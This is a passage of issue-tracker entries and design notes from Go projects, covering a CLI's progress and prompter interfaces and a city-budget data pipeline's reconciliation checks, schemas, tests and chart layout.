terminal scrolls, SIGWINCH response. Writing it in-house is possible
but fiddly and off the tool's main value path.

Idea: wrap two libraries behind the Progress interface (byob-progress.1):

- **`charmbracelet/bubbles/spinner`** for unknown-total operations.
  It's a bubbletea component, so the impl runs a tiny `tea.Program`
  and drives it via messages. The transitive weight (bubbletea +
  lipgloss) is already paid by byob-prompter.2's huh pick, so the
  marginal cost here is a direct import line, not a new dep tree.
  In exchange: a maintained, themeable spinner aligned with the
  same rendering stack the prompter uses.
- **`schollz/progressbar/v3`** for known-total operations. Pure-Go,
  actively maintained, drop-in for the fetch-and-iterate case —
  kept standalone to avoid forcing every caller to reason about a
  bubbletea `Program` for trivial progress.

Neither type escapes the `progress` package; callers see the
`Progress` interface only. This preserves the option to replace the
impl later (e.g. consolidate both paths on `bubbles/progress` when
the tool grows a richer TUI).

When to graduate further: when the tool acquires a non-trivial TUI
(dashboard, multi-pane, form-driven flows), consolidate the
known-total path on `bubbles/progress` too and drop schollz. Until
then, keeping a dedicated progress-bar impl avoids bubbletea
ceremony on the hot fetch path.

Tradeoffs:

- **Bubbletea ceremony for the spinner.** bubbles/spinner is not a
  `.Start()`/`.Stop()` wrapper — the impl has an `Init`/`Update`/
  `View` model and a goroutine running `tea.Program.Run()`.
  Heavier than a procedural spinner, but worth it for the
  maintenance story and the alignment with byob-prompter.2's rendering
  stack.
- **Prior pick (`briandowns/spinner`) was tiny but dormant.** This
  decision previously wrapped it on a "small, stable API"
  argument; upstream activity has dropped and the low-cost
  argument stopped outweighing the bitrot risk. The swap to
  bubbles accepts more ceremony in exchange for an active
  maintainer.
- **Pure-Go budget intact.** Both bubbletea and schollz honor
  byob-release.8 (no CGO).

title: Progress writes to ErrOut, never Out
description:
Problem: a spinner or bar written to stdout destroys pipeability.
`mytool fetch | jq .` gets `\r`-animated ANSI codes in its input
stream, and the `jq` parse fails — or worse, silently succeeds on
garbage.

Idea: progress writes **only** to `IO.ErrOut`. This reinforces
byob-iostreams.3 (data to Out, chatter to ErrOut) and byob-output.1
(TTY-adaptive output goes to the adaptive side). Data — the thing
a user might pipe — stays on Out, uncluttered. Chatter + progress
share ErrOut; the byob-logging.4 "quiet by default" posture keeps logs
out of the way unless asked.

Rule of thumb: if removing a print would change what a pipe
consumer sees, that print belongs to Out. Progress indicators never
qualify — their entire job is ephemeral status.

Tradeoffs: none worth noting. This is a corollary of byob-iostreams.3
more than a new decision.

title: Prompter as a narrow consumer interface
description:
Problem: a wide prompter interface (`AskOne`, `AskMany`, 20 options
per call) couples every command to a specific library's question
shape. When the library changes — or the implementation swaps for
tests — the blast radius is large.

Idea: five methods is the minimum that covers a real CLI. Each
takes `context.Context` as its first argument so prompts inherit
the caller's deadline and cancellation — a command with a deadline
should be able to abandon a hung prompt instead of waiting on
stdin forever:

```go
type Prompter interface {
    Confirm(ctx context.Context, msg string, def bool) (bool, error)
    Input(ctx context.Context, msg, def string) (string, error)
    Password(ctx context.Context, msg string) (string, error)
    Select(ctx context.Context, msg string, options []string) (int, error)
    MultiSelect(ctx context.Context, msg string, options []string) ([]int, error)
}
```

Per byob-interfaces.1, the interface lives in `pkg/cmd/prompt/` (or closer
to the consumer) and concrete impls (live, stub) satisfy it
structurally. No library type leaks into the consumer.

Tradeoffs: five methods won't cover every fancy UX (autocomplete
pickers, path completers, multi-line editors). When you need one,
add a dedicated method — don't stretch `Input` to do it. The ctx
parameter is uniform across all methods even though most callers
will pass the command's root ctx untouched — the consistency
matters more than per-method ergonomics.

title: Tier 2: reconciliation with document-derived tolerance
description:
TIER 2 IS THE TIER FOR A COMPARISON AGAINST A FIGURE THE DOCUMENT PRINTED AT A
COARSER PRECISION THAN THE CENT. There an exact gate can NEVER go green: the
ACFR's MD&A tables are captioned "(in Millions)" and footnoted "Due to rounding
amounts may differ from what's reported on the financial statements"
(p0034.txt:32 and :56; p0036.txt:7 and :47 says it again as "Numbers might not
tie to financial statements due to rounding"). So any comparison against a
number PRINTED in such a source takes its tolerance from that source's own
declared precision.

THE TOLERANCE RULE. 0.5 x unit x n_terms, or ceil(n_terms/2) cents for
dollar-precision tables. Rules carry units: dollars|thousands|millions.

The tolerance is COMPUTED FROM THE PAGE -- from the printed unit and the number
of terms in the sum -- and is never a number an author picks. Two boundaries
keep it honest, and both are already load-bearing elsewhere:

  - `unit` is the LEAST SIGNIFICANT PRINTED DIGIT, not the caption's word. The
    ACFR MD&A says "(in Millions)" and prints tenths, so unit is $100,000. Read
    the caption instead and a four-term sum would carry $2,000,000 of slack.
  - The dollar-precision branch is deliberately far too tight to absorb the
    corpus's real dollar-level discrepancies, and must not be widened to. Budget
    Book p127's Total Property Taxes is a 13-row sum off by $1; ceil(13/2) is 7
    CENTS. That $1 is the city's arithmetic and is carried by fisc-2sd's
    stated_total_deltas -- a named declaration -- not by this tolerance. The two
    mechanisms are disjoint on purpose; neither is an escape hatch for the other.

THE TWO CHECKS.

1. MAPPED ROWS SUM TO THE TABLE'S STATED TOTAL ROW.
2. THE COMPUTED FUND-BALANCE RESIDUAL EQUALS THE DOCUMENT'S STATED CHANGE IN
   FUND BALANCE. This is the clause that turns a tautology into a real
   cross-check: sources minus uses is arithmetic over facts we mapped, while the
   printed CHANGE IN WORKING CAPITAL is a figure the city published independently
   of them. Nothing in internal/check does this today.

WHAT ACTUALLY NEEDS A DOCUMENT-DERIVED TOLERANCE TODAY: ONLY THE ACFR, AND THE
ACFR IS UNMAPPED. Measured off data/extracted 2026-08-22.

  - The Budget Book (268 pages) and the CIP (323 pages) contain ZERO occurrences
    of "(in millions)", "(in thousands)" or the word "rounding". Only the ACFR
    declares a coarser unit: seven MD&A pages captioned "(in Millions)" (p0034,
    p0036, p0039, p0041, p0042, p0045, p0046) and one Statistical Section page,
    p0170:8 "(In thousands)", Taxable Sales by Category, which belongs to
    fisc-4ua.4 and is blocked there on the non-amount-column decision.
  - The MD&A really does need it. ACFR p0034 Table 1, governmental activities
    2025: 729.2 + 38.2 - 280.1 - 3.5 = 483.8 against a printed total net position
    of 483.9. The Total column likewise: 1,085.6 + 43.1 - 321.5 - 14.2 = 793.0
    against 793.1. Four terms at unit 0.1 gives a 0.2 tolerance and the observed
    error is 0.1. The other four columns of the same table tie exactly, which is
    what makes these two the document's rounding rather than a misread.
  - The mapped corpus does not need it. The spine (pp.66-67, all 240 published
    facts) ties EXACTLY: both total_row rules -- "TOTAL REVENUES:" and "TOTAL
    EXPENDITURES:" -- pass at zero tolerance today, and the fund-balance residual
    ties in all twelve (fund group x budget year) cells. FY2026: general
    158,353,870 - 159,388,024 = -1,034,154 against the printed CHANGE IN WORKING
    CAPITAL; enterprise 3,894,384; capital -2,500,213; debt-service 0;
    special-revenue 8,874,949; internal-service -6,147,533. FY2027: 2,351,098 /
    1,410,280 / -10,129,416 / 0 / 9,021,972 / -7,160,645. So check 2 is
    implementable on today's facts at ZERO tolerance.
  - pp.127-140 tie exactly in both budget columns (fisc-u2v, re-derived twice).
    pp.167-170: the 49 object rows sum to the printed General Fund Total Expenses
    in ALL FOUR columns (123,228,190 / 141,120,420 / 144,650,802 / 149,014,579)
    and the FY2026/FY2027 category sums equal p66's Wages & Benefits
    81,801,011 / 83,825,633 and Services & Supplies 62,849,791 / 65,188,946, with
    Capital Outlay and Debt Services 0/0. Six INTERMEDIATE stated totals are off
    by exactly $1, all in the FY2023-24 Actual column: p168 Finance +1 and
    ADMINISTRATIVE SERVICES TOTAL +1, p169 Planning -1 and COMMUNITY DEVELOPMENT
    TOTAL -1, p169 Public Works Administration +1, p170 Environmental Services -1
    (the last two cancel, so PUBLIC WORKS DEPARTMENT TOTAL ties). Those are
    stated_total_deltas material, not tolerance material -- see the ceil(13/2)
    argument above.

CONSEQUENCE, STATED RATHER THAN LEFT IMPLICIT. On the corpus as mapped, both
surviving checks are TIER 1 -- exact, zero tolerance. The tolerance machinery
this bead is named for has no consumer until an ACFR page is mapped, and no bead
proposes mapping the MD&A. Under this epic's own governing rule (verification
work happens only when a page being mapped demands it) that makes this bead's
P0 wrong: it should be P2 and deferred behind an ACFR mapping bead that does not
yet exist. What is P0-shaped is the fund-balance residual check at zero
tolerance over pp.66-67, which is a genuinely new claim about the corpus and
could land in the tier-1 lane (fisc-1wr.1.1) tomorrow.

SCOPE OF WORK, IF WORKED AS WRITTEN. Units on Rule; a tolerance derived per
comparison from unit and n_terms; the two checks above registered at their real
tier; and a test that a tolerance one unit too tight goes red and one unit too
loose is refused rather than accepted. There is no code in this bead for the
expenditure side of the spine -- see the 2026-08-21 and 2026-08-22 notes.

title: Determinism test: re-extract a fixture, assert byte-identical
description: Determinism is already confirmed empirically (ACFR run 3x, identical hashes); this test keeps it true. Note doc.tables order was stable across three single-machine runs but is not documented as stable across core counts -- the explicit sort in the serializer is what removes that dependency.
notes:
2026-08-22 THIS BEAD IS WRITTEN AGAINST THE RETIRED EXTRACTOR and needs
re-framing before it is actionable. Flagged while planning the backlog waves.

The description says "doc.tables order was stable across three single-machine
runs but is not documented as stable across core counts -- the explicit sort in
the serializer is what removes that dependency". There is no doc.tables. The
poppler migration (fisc-yqv) removed the table substrate entirely; see the
poppler-not-xberg memory: "There is NO table substrate and no Substrate enum".
So the specific determinism hazard this bead names no longer exists.

WHAT REPLACES IT is not nothing -- determinism is still a real property with
real hazards, just different ones. docs/agents/conventions.md states them:
"words sorted by position rather than by the tool's emission order, canonical
JSON with sorted keys, bboxes rounded to 2dp, atomic writes". Each is a thing
that could regress.

THE HARD CONSTRAINT this bead has to design around, and it is why the answer is
probably not a Go test: conventions.md says "Go tests never require Python, the
source PDFs, or the network", and re-extracting a fixture requires poppler AND
a PDF from LFS. So this cannot be `go test`. Candidates:

- a job in the monthly --full workflow (fisc-v87), which already takes the LFS
  cost and already has the PDFs checked out;
- a `make` target run by hand at extractor-bump time, which is when the
  property is actually at risk;
- a pure-Go test over the SERIALIZER only, feeding it synthetic word lists and
  asserting sorted output -- which needs no PDF and would catch the sort
  regression, though not a poppler-side change.

The third is the only one that fits the Go-tests-are-hermetic rule, and it
tests our half rather than poppler's. Decide which of the three (or which
combination) before writing anything.

Also worth stating: determinism was confirmed empirically at extraction time
(ACFR run 3x, identical hashes) and artifacts-match-manifest already guards the
COMMITTED artifacts against drift on every fisc verify run. So the gap is
narrower than the bead implies -- it is specifically "a re-extraction produces
the same bytes", which only matters at extractor-bump time.

title: Hold an Exception's Residual to the page it cites, not only to its own pins
description: DESIGN, P3. internal/structure/exception.go says Residual 'is a figure a page prints or the difference of two figures on one page' and Printed says where. In the tree this claim is held in two places with different reach: ValidateExceptions holds Residual to sum(Against - Cut) over the pins and Reconcile holds the pins to the store (so verify holds the ARITHMETIC), and internal/check/printedresiduals_test.go TestEveryExceptionResidualIsPrintedWhereItSaysItIs holds the PRINTED claim by a hand-typed table of (page, line, token) rows checked against data/extracted with strings.Contains (so only go test holds the citation, and a new exception is a finding there). Measured this pass: the cited lines print what they say (p0073.txt:23,30,37,44,53,55,56; p0075.txt:53,55,56; p0066.txt:24; p0067.txt:34), and none of 9,393,147 / 28,693,590 / 14,832,000 / 35,930,251 is a fact (grep of their cent values in facts/facts.jsonl returns 0), so fisc verify itself never reads the page for a residual. What needs doing, if anything: decide whether the Printed citation should become a locator (doc, page, offset, token) that cuts-tie-along-the-lattice re-reads the way fact-offset-points-at-token does, retiring the hand-typed table; or record that the test is the arm and leave the check's summary text as prose. Either way the exception.go comment should say which arm holds which claim.

title: cuts-tie-along-the-lattice must use ValidateCuts' empty list rather than recomputing emptiness by scope
description: FAIL-OPEN, latent. internal/check/containment.go discards the []string ValidateCuts returns ('if _, err := structure.ValidateCuts(...)') and decides which cuts to skip by whether ANY fact carries the cut's Scope. The two disagree for a cut selected by Rules: internal/structure/cut.go's ValidateCuts, when DerivedLevel finds no admitted fact, appends the cut to empty and continues BEFORE the loop that refuses a Rules entry producing no fact (the check at 'cut selects rule which produces no fact in scope' is never reached for an admits-none cut). So acfr-fund-balances/general with its rule id renamed or deleted in mappings/*.yaml is: returned as empty by ValidateCuts, ignored by the check, judged non-empty by scope because acfr-p0167-other-governmental-fund-balances still has facts, and handed to Compare as a side that prints nothing. Latent today only because every pair involving either acfr-fund-balances cut is refused by name (bases or fund-group axis) -- measured off ./bin/fisc verify's cuts-tie summary at 939273e. The grain arm does not cover this case: it refuses a rule that DECLARES a grain and has no fact, not a cut naming a rule that no longer exists. What needs doing: have the check read ValidateCuts' empty list into isEmpty (or refuse a Rules entry naming no rule before the admits-none early-out), and add the mutation to containment_test.go: rename the rule in a fixture cut and assert the check goes red rather than comparing.
close_reason: ValidateCuts refuses a cut naming a rule no fact carries before its admits-none early-out, and cuts-tie-along-the-lattice reads ValidateCuts' empty list (structure.EmptyCuts where no rule file is loaded) instead of judging emptiness by scope. Mutation in containment_test.go: acfr-p0167-general-fund-balances deleted from its mapping and its facts from the store was green with '10 cut(s)' before, red with the cuts arm's refusal after.

title: scheduleKey inverts project.PublishedStem and no test holds the two together
description:
internal/export/column.go's scheduleKey strips a year suffix to recover the schedule a stem's document becomes in its column, and it is the inverse of project.PublishedStem, which appends that suffix when a projection publishes more than one column.

TWO SPELLINGS OF ONE RULE, IN TWO PACKAGES, WITH NOTHING HOLDING THEM TOGETHER. internal/export does not import internal/project, so the inversion is asserted nowhere: change the suffix PublishedStem appends and scheduleKey goes on stripping the old one, mapping every multi-column document to a schedule key that is the stem itself.

FOUND BECAUSE THE COMMENT CLAIMED OTHERWISE. column.go said TestScheduleKeyInvertsTheStemRule holds the two together; no such test exists, and tools/doccheck's test-name arm is what surfaced it. The comment now says the claim is unguarded rather than naming a test that is not there.

pkg/cmd/export's TestTheCommittedStemsAreUnchanged pins the nineteen stems as strings and says nothing about the inversion.

WHAT WOULD CLOSE IT: a test in pkg/cmd/export -- which imports both -- that round-trips every published stem through scheduleKey and asserts it lands on the projection name PublishedStem was given. Mutation: change the suffix on one side.
acceptance_criteria: A test that fails when PublishedStem's suffix and scheduleKey's yearSuffix disagree, with that mutation run and recorded.

title: columnShare divides where the client's licence says sum, and paintCounts counts the store
description:
TWO BORDERLINE CASES FOUND WHILE AUDITING THE Go/JS BOUNDARY, 2026-09-22, filed
together because one decision settles both: what exactly the client's arithmetic
licence permits.

THE LICENCE, as fisc-lwh5 states it: the client may ADD published summands whose
membership is Go's, because every summand is a figure link-values-tie-to-facts
already witnesses and the merge happens where fisc verify cannot reach. It
explicitly does not reach a derived mark, whose cents is a difference.

(1) columnShare, site/app.js ~:4839, computes 100 * d.value / total over the
marks d3 laid in one column and renders "our N% of this column". A RATIO IS NOT
A SUM. It is self-disclosed -- the diamond, the word "our", and a comment saying
"IT IS ARITHMETIC AND SAYS SO" -- and it is computed over the LAID column, which
is a function of the fold and so of the reader's viewport, which Go cannot see.
That last point is the strongest argument for leaving it where it is, and it is
also the argument the merged ribbon's cents already won. So the question is
whether the licence should say "sum" or "any figure over published summands at a
membership Go declared", and the answer should be written where fisc-lwh5's is.

(2) paintCounts, site/app.js ~:1795, composes "N flows between M nodes, from X of
the document's Y facts", where Y is Go's counts.facts and X is a set-union over
the fact_ids of the ribbons actually drawn. That is a sentence about how much of
a schedule the reader can see. The union is over published ids and the
membership is the fold's, so it is the same shape as (1) with a count instead of
a ratio.

NEITHER IS WRONG ON THE COMMITTED CORPUS. What is wrong is that the licence does
not say which of them it permits, so the next figure of this kind has nothing to
be measured against.

title: The spine's label arms measure an inert page: spineConfig declares no steps, so no node is drillable
description:
FOUND while deriving the column ceiling from the step declarations (fisc-ipif), 2026-09-22.

tools/jscheck/harness.mjs's spineConfig() claims in its own doc comment to be 'a
page config that draws the spine the way index.html declares it'. It carries the
render tiers and NOT the steps, and index.html ships both -- pkg/cmd/export/data.go
declares four steps on the spine view.

WHAT THAT COSTS, MEASURED. Adding stepShapes() to spineConfig() and changing
nothing else takes tools/jscheck/layout.mjs's arm 'the spine's middle column is
centred because anchoring it outward does not fit' from PASS to FAIL: 4 of 6
outward anchors crossing into the next column's half of the band becomes 6 of 6.
A drillable node's label is not the width of an inert one, and app.js's own
comment pins the 4.

SO THE LABEL ARMS ARE MEASURED ON A PAGE WHERE NOTHING OPENS, and the shipped
spine is a page where four steps do. Either the figure app.js pins is the wrong
one, or the arms are deliberately about the inert layout and should say so. It is
a reading question rather than a predicate question, which is why it is filed
rather than patched.

WHAT EXISTS NOW: harness.steppedSpineConfig(), spineConfig plus the declared
steps, used by the arms about the column ceiling. The label arms still use
spineConfig. Deciding this bead collapses the two builders back into one.

MUTATION IF TAKEN: point the label arms at steppedSpineConfig and re-measure
before touching app.js's pinned figure. Regenerating the number to fit the new
fixture without reading why it moved is the defect to avoid.

title: seam.mjs permits an optional typedef property against any key, and the schema now makes the pairing exact
description:
FOUND while landing page.schema.json, 2026-09-21. Not fixed, because the premise needs measuring before the arm is tightened.

TODAY: tools/jscheck/seam.mjs compares app.js's JSDoc typedefs, the Go struct
tags and schema/page.schema.json's property names, and it compares NAMES ONLY.
Its own comment says why an optional property is permitted against any key:

  `omitempty` and `[name]` mean the same thing from opposite sides and
  pinning the two together would fail on a key Go always writes and the client
  sensibly guards.

THAT ARGUMENT IS ABOUT THE GO TAG AND NOT ABOUT THE SCHEMA. A schema's
`required` array is exact where `omitempty` is not: page.schema.json says
render_tiers, steps, root and rungs are optional and the other six are not, and
app.js's FiscConfig marks exactly those four `[name]`. So the pairing
typedef-optional <-> schema-not-required may already hold, in which case the arm
can assert it and a key that becomes optional on one side alone stops passing.

WHAT TO MEASURE FIRST, and it is why this is not a one-line change: whether the
pairing holds for all four types the arm covers (FiscConfig, FiscYear,
FiscStepDoc, FiscDrillStep), and whether any is a key the client sensibly guards
though the schema requires it. If even one is, the honest answer is to keep
names-only and record the exception rather than to loosen the rule back.

MUTATION IF TAKEN: mark a required key optional in the typedef alone. Today
green.

title: The projection documents have no schema, and their shape is stated only in Go and in prose
description:
The last un-schema'd artifacts on the Go side of the boundary.

WHAT HAS NONE: internal/project's output -- sankey.json and its siblings --
plus data/revenue-trends.json and the two fund-balance documents.

WHY IT IS P3 AND NOT HIGHER. The projection documents are no longer PUBLISHED
as themselves: internal/export folds them into one file per column, and the
column has a schema validated against its emitted bytes. So a reader never
fetches one, and the client never reads one. The shape matters as a Go-to-Go
contract -- internal/export decodes them as bytes and does not import
internal/project, so the two packages are coupled by json tags alone.

WHAT WOULD MAKE IT WORTH DOING: internal/export's `decoded` struct is the
decode side of that coupling, and a renamed tag on either side is a field that
decodes to its zero value with no error anywhere. That is the same failure
page.schema.json was written for one layer up.

THE FENCED BLOCK IN docs/sankey-contract.md IS NOT A DUPLICATE TODAY, measured
2026-09-21 against testdata/sankey.golden.json: every key it shows is present
and its counts are the golden's. It is one of only two statements of that shape,
the other being the Go structs, so it stays until a schema exists to hold the
bytes -- at which point it becomes the third spelling and goes, the way
general-fund-drilldown-contract.md's did.

data/revenue-trends.json and the balance documents ship byte for byte and are
held by a copy test plus goldens (internal/export/export_test.go's
TestWriteCopiesAColumnlessProjectionVerbatim). That is a weaker guarantee than a
shape contract and is stated as such in docs/schema-contracts.md.
close_reason: schema/projection.schema.json and schema/series.schema.json land, validated by internal/project's own encoder on every build, with a parity test on each side of the internal/export seam: equality against the emitting structs and containment against the decoders. docs/sankey-contract.md's fenced block retires as the third spelling, as this bead and docs/schema-contracts.md both said it would.

title: Nothing states that every step after the repaint's first painter is total
notes:
DO: assert the invariant showYear and redrawStack depend on, instead of leaving
it to the fixtures that happen to exercise it.

THE INVARIANT. Both functions shape, lay out and derive the flow table's rows
BEFORE they write a word, so a throw from any of those is a refusal with the
page untouched. Everything called after the first painter must therefore be
total: if one of them throws, the reader is left with one year's words over
another year's chart.

WHY THIS NEEDS SAYING RATHER THAN BEING OBVIOUS. buildTable was the
counter-example for months. It ran last, emptied the <tbody> and appended row
by row, and building a row reads every link's fact_ids and locators -- so a
document missing either left a half-written table under the other year's
heading. MEASURED over five malformed-document fixtures in
tools/jscheck/lifecycle.mjs: three of the five split the page that way. It is
now tableRows(doc) inside the try plus one replaceChildren after it, and all
five are consistent.

fisc-bsg's close reason states that the deleted shape gate "buys the MESSAGE
only" and that the page "still refuses without splitting". That is true of the
key it was measured on (nodes.map, which throws inside layOut) and false of the
three buildTable reaches, which is why that bead is superseded by this one
rather than annotated.

THE SHAPE WORTH HAVING IS A SCAN, NOT ANOTHER FIXTURE. The five fixtures catch
a regression by accident of coverage; the next step added to the repaint would
reintroduce it and only a fixture that happens to throw there would notice.
seam.mjs's KNOWN_SELECTORS pattern applied to the repaint sequence -- each
function named in showYear and redrawStack after the first painter is on a
declared list of ones that cannot throw -- is the form that holds.

title: The repaint is atomic by construction, and no test says so on its own
notes:
DO: assert the property showYear and redrawStack now have, rather than
inferring it from the fixtures that happen to exercise it.

WHAT CHANGED. fisc-bsg was closed by moving shapeFor and layOut ahead of the
repaint, with a comment claiming "everything in the draw that can throw is in
layOut". That was false: buildTable ran LAST, emptied the <tbody> and appended
row by row, and building a row reads every link's fact_ids and locators. A
document that threw part way through left a half-written table under the other
year's heading -- the same split, one function later.

It is now split in two: tableRows(doc) derives the rows and runs beside
shapeFor and layOut, inside the same try; buildTable(rows) does one
replaceChildren. So a throw from the derivation is a refusal with the page
untouched, and the write cannot throw.

WHAT IS MISSING. Nothing states the invariant -- "every function called after
the first painter is total" -- so the next step added to the repaint can
reintroduce it exactly as buildTable did, and only a fixture that happens to
throw there would notice. lifecycle.mjs's five malformed-document fixtures
catch it today by accident of coverage, not by design.

The shape worth having is a scan, not another fixture: the repaint sequence in
showYear and redrawStack names N functions, and each must be on a declared list
of ones that cannot throw -- the seam.mjs KNOWN_SELECTORS pattern, applied to
the repaint.

title: No way to give the chart the whole window; the widest views are read in a 1513px box
description:
DO: decide whether the chart gets a full-window or full-screen mode, and what it
does to the fold.

Reported from a browser session: there is no click-to-fullscreen. Today the
chart's width is capped by .chart-wrap's `--chart-room: min(1513px, calc(100vw -
56px))` (site/style.css), so on a 2560px display the figure stops at 1513px and
the rest of the window is margin. 1513px is chartWidth(4) and is pinned -- not
copied -- by tools/jscheck/layout.mjs, which refuses a stylesheet allowing less
than the width app.js lays four columns out at.

WHY IT IS WORTH MORE HERE THAN ON A TYPICAL CHART. The views a reader most wants
room for are the ones the cap exists to shrink: an expanded fund column draws 32
marks, 12 of whose labels run past the 250px gutter at layout.mjs's estimate, and
the uncapped shape is 42 ribbons of which 9 lay out under a pixel. More width is
the only thing that makes those readable without folding them away.

THE DESIGN QUESTIONS, and they are the work rather than the CSS:
  - Does wider mean MORE COLUMNS or WIDER COLUMNS? They are different answers.
    More columns is a budget question and belongs with the column control; wider
    columns is purely room for the labels and changes no membership.
  - Does the fold relax? capColumn's caps are declared per tier by
    DrillStep.Caps and are measured against sub-pixel ribbon counts at a given
    width. A cap that is correct at 1513px may be pessimistic at 2560px, which
    makes the cap a function of width -- something Go currently declares
    statically and the client applies.
  - Fullscreen API or just a width release? The Fullscreen API needs a user
    gesture, changes focus handling and the Escape key's meaning -- and Escape
    already pops a rung in this chart. A "wide mode" toggle that drops the
    1513px cap has none of those costs and most of the benefit.

DEPENDS ON A BROWSER for the part that matters: whether the wider chart reads
better or merely bigger is not answerable by any check in this tree.
notes:
2026-09-22: THE FIRST OF THE THREE DESIGN QUESTIONS IS ANSWERED, and the other
two are narrowed.

"Does wider mean MORE COLUMNS or WIDER COLUMNS?" -- the owner's answer is more
columns, to see funding end to end. So this is fisc-ipif's subject and not a
width release, and the two beads are one thing: fisc-dphn is superseded by
fisc-ipif for the same reason.

"Fullscreen API or just a width release?" is moot under that answer: the ceiling
is derived from the declared steps at 96c1035, so the chart already takes every
column the page offers and the cap follows without a stylesheet edit.

WHAT SURVIVES AS THIS BEAD'S OWN IS THE THIRD QUESTION, and it is real: "Does the
fold relax? A cap that is correct at 1513px may be pessimistic at 2560px, which
makes the cap a function of width -- something Go currently declares statically
and the client applies." That is now the sharper version of itself, because the
ceiling moves per reader and DrillStep.Caps does not. Changing a cap changes
MEMBERSHIP, which is Go's, so it is a declaration decision rather than a client
one.

title: docs/ and README carry the same prose as beads and Go comments, under no gate
description:
DO: decide whether the narration family gains an arm over docs/*.md, README.md
and AGENTS.md, and settle the self-reference problem that arm runs into.

WHERE THE RULE IS ENFORCED NOW: Go comments (tools/narration), the injected
memories (tools/memcheck), and the committed bead export (tools/beadcheck).
docs/ is the project's evidence prose and is read by anyone following a "Why,
measured" link out of AGENTS.md; nothing checks it.

THE CLEANUP IS ONE PASSAGE, measured over docs/*.md, README.md and AGENTS.md
with the bead patterns re-aimed at a document as the subject:

  docs/sankey-contract.md -- a passage stating what an earlier version of its
  own table said about Capital's transfers out, rather than stating what the
  table says now.

So unlike the beads arm, landing this needs almost no correction first.

THE BLOCKER IS AGENTS.md ITSELF, and it is a real decision rather than an
oversight. The rule's own statement quotes the erratum form as its example, so
any arm reading AGENTS.md refuses the file that carries the rule. Three ways out
and none is free: exempt AGENTS.md by name, which is an exemption nothing
re-derives on the one file most likely to be read as the rule; reword the rule
to describe the form instead of quoting it, which costs the clarity the example
buys; or scope the arm to docs/ and README and leave AGENTS.md out, which is
honest but leaves the rule's own home ungoverned. doccheck hit the same
collision against its own citation pattern and records how it chose.

WORTH KNOWING BEFORE STARTING: a docs/ arm reads Markdown, so it has no comment
grammar to lean on the way the Go arm leans on go/scanner, and no JSON field
list the way beadcheck does. Every word in the file is in scope, which makes a
narrow pattern list matter more here than anywhere else.

title: make narration reads Go comments and memories; beads and docs/ carry the same prose under no gate
description:
DO: give `make narration` an arm over the committed bead export, so the rule it
enforces in Go comments and in the injected memories also holds in the largest
medium carrying prose here.

THE ARM IS A FULL GATE, unlike the memory arm beside it. Memories live in the
Dolt DB and in no git artifact, which is why memcheck warns and continues when
bd cannot answer. .beads/issues.jsonl is committed, so an arm over it needs no
bd, no Dolt and no network -- the property that makes beadrefs a required CI
check. Build it that way.

THE PHRASE LIST IS THE WORK, and it is narrower than the Go arm's. Measured over
the 680 issues in the export, the credit line that the Go arm refuses appears in
109 of them, and it is not an erratum there: AGENTS.md forbids that credit in
SOURCE and asks for it in a commit message, and in a bead it is provenance of a
finding. Refusing it would demand the sweep AGENTS.md refuses.

NOR CAN THE LIST TAKE A BARE PAST-TENSE VERB. Six beads name their own
REQUIREMENT in the past tense -- the form "the guard this bead asked for is now
paid for" -- and every one is a true sentence. A pattern catching them teaches
people to reword around the gate instead of to stop writing errata.

SO THE DISCRIMINATOR IS TENSE ABOUT THE TEXT, not the verb: the bead as the
subject of a claim that its own wording has changed. That list refuses four
beads on the committed export, which is a landable cleanup.

KEEP IT TWO OR THREE NARROW PATTERNS AND NOT A PROSE DETECTOR, for the reason
the Makefile's narration comment gives: a wide net refuses true sentences about
the city's documents, which reprint schedules.

EXPECT THE GATE TO REFUSE THE BEAD THAT DOCUMENTS IT if that bead quotes the
patterns rather than describing them. doccheck hit the same collision with its
own citation pattern. Let the literal list live in the tool and point at it.
close_reason: Landed as tools/beadcheck, wired as the second arm of make narration. Three patterns, all requiring the bead to be the subject of a past-tense claim about its own text; the credit line and bare past-tense verbs are deliberately absent, per the description. Four beads corrected to land it green: fisc-mq4.7, fisc-jf8x, fisc-73cq (two passages) and fisc-oakx.2, each keeping its corrected statement and its measurements. docs/ and README are still ungoverned and are filed separately.

title: A folded tail on a kept flank loses its ribbons in silence, where Go refuses the same shape
description:
THE CLIENT'S KEPT HALF IS FILTERED TO THE IDS GO ANSWERS (heldFor/heldBy in site/app.js), and a folded tail is an id no answer can name: capColumn composes aggregate/tail/N in the browser, so a chart on screen carrying one at a tier the next step KEEPS has that tail's ribbons dropped by the membership filter rather than drawn or refused.

LATENT ON THE COMMITTED CORPUS, and the Rung typedef says why it is measured rather than feared: every kept flank the shipped steps declare is a single-node column or the spine's ten categories, so no flank has ever carried a capped tail. sideOf does cap a kept half's columns, so the shape is reachable by declaration alone.

WHAT GO DOES WITH THE SAME SHAPE: rungWalker.answer refuses a residual or gap mark at a kept tier by name -- 'which is a column this walk has no shape for'. The client should refuse a tail there for the same reason rather than quietly drawing a flank short of money.

THE COST OF FIXING IT is an unexercised refusal, which is the thing AGENTS.md, 'Prove it can fail' warns about. So the fix is a refusal AND a hand-built arm in tools/jscheck/drill.mjs that drives a chart carrying a tail at a kept tier, in the style of the windowFor refusals beside it.

title: Go and the chart template still describe Revenue and Spending as pages the site ships
description:
FALSE-CLAIM. fisc-4942 was the app.js half of this; these are its siblings outside site/app.js, found with the same grep and left for a commit whose boundary reaches them.

  internal/export/export.go:226-227  ChartSubject -- "Revenue draws revenue categories into fund groups; Spending draws one fund into its divisions", in the present tense, as the example of what a packager names.
  internal/export/export.go:242-250  Root -- "Spending draws tiers {3,4} of fund-flows", and "Spending says only the General Fund has a spending side; Root is where it says so to the client". No view declares a Root at all now (data.go sets the field nowhere), which is fisc-1osz's question.
  site/chart.html.tmpl:9             "spending.html shipped a description of revenue and revenue.html one of spending".
  site/chart.html.tmpl:127-135       the fund-swatch rule, with its measurement: "6 buttons on revenue.html's overview, 0 on spending.html and 0 on all 29 opened views", and the rule itself keyed on "for spending.html and for every OPENED view".

THE SHAPE OF THE FIX IS fisc-4942'S: several carry a real measured claim attached to a dead page name, so re-attach the claim to the step that draws those tiers and RE-MEASURE rather than renaming. chart.html.tmpl's 6/0/29 is the one with a live analogue worth measuring -- the count of clickable fund-group swatches on the one chart page's overview against its opened views -- and it cannot be carried across unmeasured.

NOT IN SCOPE HERE, and deliberately: pkg/cmd/export/data.go:721-745 and pkg/cmd/export/export_test.go:1200-1204 name the two pages as RETIRED. The first explains the merge that replaced them and the second is the guard that keeps them retired; both are true as written.
close_reason:
